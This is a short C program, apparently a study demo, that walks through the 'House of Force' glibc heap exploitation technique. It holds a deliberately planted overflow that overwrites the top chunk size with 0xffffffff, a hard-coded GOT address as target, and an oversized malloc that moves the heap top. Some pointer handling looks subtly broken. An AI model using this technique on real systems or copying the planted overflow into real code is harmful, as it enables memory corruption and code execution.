// IDEA: USE AFTER FREE SULL'ULTIMO CHUNK LIBERATO + INTEGER OVERFLOW SULLA MALLOC CONTROLLATA + HOUSE OF FORCE 



#include <stdio.h>
#include <stdlib.h>

unsigned int puts_got = 0x08049ce4;

int main(int argc , char* argv[]){

	char overflow_data[300] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xff\xff\xff\xff";
	
	unsigned int p_overflow_data = overflow_data;

	printf("\nWelcome to the House of Force\n\n");
	
	printf("Let's allocate the first chunk right over the Top Chunk\n");
	unsigned int p1 = malloc(256);
	printf("The chunk of 256 bytes has been allocated here 0x%08x\n",p1);

	printf("Now let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");

	//----- VULNERABILITY ----
	memcpy(p1,&p_overflow_data,264); 
	//------------------------

	printf("Now that we have overflowed the Top Chunk header with a size 0xffffffff we simulate an attacker controlled malloc() with a very big size\n");
	printf("it will return the current (av->top)+8 that we are not controlling yet\n");
	
	//perchÃ¨ segfaulta con un valore arbitrario? 
	unsigned int delta = 0xb7ffff74; // this is usually attacker controlled in this technique
	unsigned int p2 = malloc(delta); // this will set the av->top at a controlled position: (p-8+delta)
	printf("The large chunk has been allocated here %08x\n",p2);
	
	//printf("In av->top now we have %08x\n", p2-8+delta);
/*	
	printf("This last malloc will be served from the remainder code and will return the av->top injected before\n");
	
	unsigned int p3 = malloc(1024); 

	printf("p3 is %08x\n",p3);  

	fflush(stdout);

	printf("Now everything that copies stuff inside p3 is an exploitable stack buffer overflow\n");
*/
}




//0x8048532